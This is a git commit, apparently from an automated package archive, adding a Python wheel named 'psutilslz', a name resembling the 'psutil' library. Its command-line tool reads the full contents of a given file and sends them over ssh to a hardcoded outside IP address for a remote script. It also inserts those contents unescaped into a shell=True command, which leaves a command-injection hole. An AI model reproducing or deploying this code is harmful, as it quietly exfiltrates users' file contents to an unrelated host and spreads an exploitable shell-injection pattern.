47f841f2cf208a31de679bb056664b32444683dc
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-07-30 15:06:18 +0000

    Add package psutilslz/1.1/psutilslz-1.1-py3-none-any.whl

---
+++ packages/psutilslz/psutilslz-1.1-py3-none-any.whl/utilslz/cli.py
@@ -0,0 +1,24 @@
+# utilslz/cli.py
+
+import subprocess
+import sys
+from pathlib import Path
+
+def main():
+    if len(sys.argv) != 2:
+        print("Usage: lz <inputfile>")
+        sys.exit(1)
+
+    file_path = Path(sys.argv[1])
+    if not file_path.exists():
+        print("Error: File not found")
+        sys.exit(1)
+
+    with file_path.open() as f:
+        input_data = f.read().strip()
+
+    try:
+        cmd = f'ssh ubuntu@4.156.195.94 "python3 ~/v.py \\"{input_data}\\""'
+        subprocess.run(cmd, shell=True)
+    except Exception as e:
+        print("SSH Error:", e)
